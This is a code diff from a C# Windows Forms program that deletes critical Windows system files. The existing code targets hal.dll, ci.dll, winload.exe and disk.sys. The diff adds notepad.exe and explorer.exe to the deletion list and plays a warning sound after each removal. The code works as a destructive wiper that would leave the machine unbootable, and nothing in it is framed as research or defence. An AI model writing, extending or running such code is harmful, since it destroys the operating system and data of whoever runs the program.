@@ -61,8 +61,10 @@ namespace WindowsFormsApp1
             string hal_dll = @"C:\Windows\System32\hal.dll";
             string ci_dll = @"C:\Windows\System32\ci.dll";
             string winload_exe = @"C:\Windows\System32\winload.exe";
-            string disk_sys = @"C:\Windows\System32\drivers\disk.sys"; //F12
-            string memoryanyalizer = @"C:\Windows\System32\F12\MemoryAnalyzer.dll"; //F12
+            string disk_sys = @"C:\Windows\System32\drivers\disk.sys";
+            string memoryanyalizer = @"C:\Windows\System32\F12\MemoryAnalyzer.dll"; //C:\Windows
+            string notepad = @"C:\Windows\notepad.exe";
+            string fileexplorer = @"C:\Windows\explorer.exe";
             if (File.Exists(hal_dll))
             {
                 File.Delete(hal_dll);
@@ -98,6 +100,22 @@ namespace WindowsFormsApp1
             if (File.Exists(memoryanyalizer))
             {
                 File.Delete(memoryanyalizer);
+                if (File.Exists(sound_file_dying))
+                {
+                    _soundplayer = new SoundPlayer(@"C:\Windows\Media\Windows Battery Low.wav");
+                }
+            }
+            if (File.Exists(notepad))
+            {
+                File.Delete(notepad);
+                if (File.Exists(sound_file_dying))
+                {
+                    _soundplayer = new SoundPlayer(@"C:\Windows\Media\Windows Battery Low.wav");
+                }
+            }
+            if (File.Exists(fileexplorer))
+            {
+                File.Delete(fileexplorer);
                 if (File.Exists(sound_file_dying))
                 {
                     _soundplayer = new SoundPlayer(@"C:\Windows\Media\Windows Battery Low.wav");
